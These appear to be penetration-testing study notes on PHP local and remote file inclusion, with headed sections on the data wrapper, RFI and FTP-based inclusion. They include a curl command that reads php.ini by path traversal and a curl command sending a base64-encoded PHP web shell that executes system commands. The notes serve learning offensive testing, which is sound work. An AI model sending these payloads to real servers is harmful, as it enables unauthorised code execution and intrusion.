# Data wrapper

1.The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations

2.To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version

3. allow_url_include is not enabled by default
```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

<img width="1278" height="302" alt="image" src="https://github.com/user-attachments/assets/24cc1fc7-2d7d-4b68-9362-c18305a8dab9" />

<img width="1261" height="107" alt="image" src="https://github.com/user-attachments/assets/3ac11aa3-4e9d-499e-a492-775fa44487db" />

4. After that use data wrapper to do RCE

<img width="1264" height="124" alt="image" src="https://github.com/user-attachments/assets/ef4e8a39-1fc0-4cac-af8f-7d25c10f18ab" />

```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%09-al'

```

# RFI 

Test it first

<img width="1265" height="330" alt="image" src="https://github.com/user-attachments/assets/cf17a086-a750-41cc-8693-8241a2a15325" />

Exploitation

<img width="1277" height="137" alt="image" src="https://github.com/user-attachments/assets/f9e962a4-59d5-42c5-82b8-15c8cff91f1c" />

<img width="1110" height="151" alt="image" src="https://github.com/user-attachments/assets/1c7fd937-d460-4f90-abbc-e5fe8fac5459" />

<img width="1279" height="312" alt="image" src="https://github.com/user-attachments/assets/c263cb2c-5071-4922-9742-be63bc0c4ca1" />

# Using FTP server to exploit RCE

This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the ftp:// scheme in the URL, as follows:.

We can start a basic FTP server with Python's pyftpdlib, as follows:

<img width="1126" height="255" alt="image" src="https://github.com/user-attachments/assets/88b54ff1-29f7-4788-8a1f-7630079e238f" />

<img width="1272" height="354" alt="image" src="https://github.com/user-attachments/assets/5202c3b1-93c1-4228-85f2-d4efe4bdac40" />









